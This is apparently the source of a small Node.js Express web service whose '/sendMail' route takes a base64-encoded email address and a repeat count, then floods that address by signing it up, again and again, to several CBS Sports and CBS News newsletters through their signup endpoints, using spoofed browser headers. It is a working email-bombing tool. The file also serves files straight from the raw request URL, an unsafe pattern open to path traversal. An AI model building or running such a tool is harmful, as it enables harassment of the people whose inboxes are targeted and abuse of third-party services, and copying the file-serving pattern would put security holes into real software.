import express from 'express';
import fs from 'fs';
import fetch from "node-fetch";
import { dirname } from 'splendid-ui/node'
const __dirname = dirname(import.meta.url);
const app = express();
var num = 0;
var errs = 0;
function createDirectory(directoryPath) {
    if (!fs.existsSync(directoryPath)){
        fs.mkdirSync(directoryPath);
    }
}
function spam(theemail, encodedEmail, path){
    fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-requested-with": "XMLHttpRequest",
        },
        "referrer": "https://www.cbssports.com/newsletters/cbs-sports-hq/",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23661&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
        "method": "POST",
        "mode": "cors"
    }).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/pick-six/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23664&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/fantasy-football-today/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23662&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/fantasy-baseball-today/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23663&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbssports.com/fantasy/newsletter-sign-up/xhr/", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-requested-with": "XMLHttpRequest",
            },
            "referrer": "https://www.cbssports.com/newsletters/the-first-cut/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "action=optIn&custId=&destination=cbs&masterProductId=23708&mCode=m23584&source=nlsplash&userLogin=&emailAddress=" + encodedEmail,
            "method": "POST",
            "mode": "cors"
        });
    }).then(function(response) {
        return fetch("https://www.cbsnews.com/newsletters/xhr/signup", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "text/plain",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin"
            },
            "referrer": "https://www.cbsnews.com/newsletters/widget?v=4303070594ae09e4278f40f24f771b58&subs=e889%2Ce881%2Ce882%2Ce879%2Ce883%2Ce884%2Ce241",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + theemail + "\",\"sub\":\"e889,e881,e882,e879,e883,e884,e241\"}",
            "method": "POST",
            "mode": "cors"
        });
    }).catch(function() {
        errs++;
    }).then(function(response){
        num++;
        fs.writeFileSync(path + '/num.txt', num.toString());
        fs.writeFileSync(path + '/errs.txt', errs.toString());
    });    
}
app.use(express.static("static"));
app.get('/sendMail/:id1/:id2/index.html', (req, res) => {
    errs = 0;
    num = 0;
    const id1 = atob(req.params.id1);
    const id2 = atob(req.params.id2);
    const theemail = id1;
    const times = Number(id2);
    const encodedEmail = theemail.replace('@', '%40');
    createDirectory(__dirname + "/sendMail");
    createDirectory(__dirname + "/sendMail/" + req.params.id1);
    createDirectory(__dirname + "/sendMail/" + req.params.id1 + "/" + req.params.id2);
    fs.writeFileSync(__dirname + req.url.slice(0, req.url.length - 11) + '/num.txt', "Loading...");
    for(var i = 0; i < times; i++){
    spam(theemail, encodedEmail, __dirname + req.url.slice(0, req.url.length - 11));
    }
    res.sendFile(__dirname + '/spamPages/spam.html');
});
app.get('/sendMail/:id1/:id2/:id3', (req, res) => {
    res.sendFile(__dirname + req.url);
});
app.listen(8080, () => {
    console.log('Server is running on port 8080');
});
